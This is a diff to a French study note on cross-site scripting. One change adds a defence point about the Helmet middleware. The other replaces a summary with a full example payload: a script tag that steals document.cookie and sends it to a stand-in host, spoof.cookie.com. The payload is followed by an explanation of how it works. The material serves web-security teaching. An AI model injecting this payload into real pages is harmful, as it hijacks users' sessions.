@@ -31,6 +31,7 @@ Protection efficace → combinaison de plusieurs approches :
 1. **Échappement systématique** du contenu avant affichage dans les templates.
 2. **Frameworks modernes** (React, Vue, Angular) qui échappent automatiquement le HTML injecté.
 3. Validation stricte côté serveur :
+   - Utiliser des middlewares comme **Helmet** (`app.use(helmet())`) pour sécuriser les headers HTTP.
 
 - supprimer les balises `<script>`,
 - filtrer les événements HTML (`onclick`, `onload`).
@@ -62,11 +63,14 @@ En pratique, l’attaquant vole la **session**, ce qui équivaut à voler l'acc�
 
 ## **XSS4 — Effet du script fourni**
 
-Le script malveillant :
+Le script : 
+>`<script language=etmlscript>console.log("you have been hacked by Narut0"); window.location.href="https://spoof.cookie.com?data="+document.cookie;</script>`
 
-1. Exécute un code dans la page (preuve de compromission).
-2. Exfiltre les cookies via une requête GET.
-3. Redirige la victime.
+Si ce script est exécuté (malgré l'attribut `language` exotique) :
+
+1. **Message console** : Affiche "you have been hacked by Narut0" (Preuve de concept).
+2. **Vol de session** : Redirige l'utilisateur vers `spoof.cookie.com`.
+3. **Exfiltration** : Passe le contenu de `document.cookie` (contenant l'ID de session) en paramètre GET `data`.
 
 En plus :
 
